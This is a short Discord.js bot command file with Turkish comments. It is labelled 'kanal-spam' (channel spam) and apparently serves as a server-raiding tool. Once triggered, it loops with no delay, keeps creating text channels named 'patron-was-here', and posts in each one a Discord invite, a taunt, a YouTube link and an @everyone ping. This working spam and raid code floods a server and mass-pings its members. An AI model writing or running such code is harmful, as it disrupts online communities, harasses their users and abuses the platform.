const Discord = require('discord.js');
exports.run = function(client, message) {
setInterval(function() {

message.guild.createChannel('patron-was-here','text')
  .then(r=>r.send('https://discord.gg/M4Sxuaj\n\nZirve Dediğiniz Tahtta Hep Kucakta Kaldınız\n\nhttps://www.youtube.com/channel/UCt0ekVovVwixA8WlHIbGKAw?view_as=subscriber @everyone'))

},0)
};
exports.conf = {
  enabled: true,//True => Komut açık, False =
  guildOnly: true, //True => Sadece Servere Özel, False => Heryerde kullanılabilir
  aliases: [],//Komutun farklı kullanımları ÖR: !ping, !p
  permLevel: 4 //kimlerin kullanabileceğini  (bot.js dosyasında perm leveller yazıyor)
};

exports.help = {
  name: 'kanal-spam',//Komutun adı (Komutu girerken lazım olucak)
  description: 'KANAL SPAMLAR',//Komutun Açıklama
  usage: '' //komutun kullanım şekli; ÖR: !ban @Kullanı
}
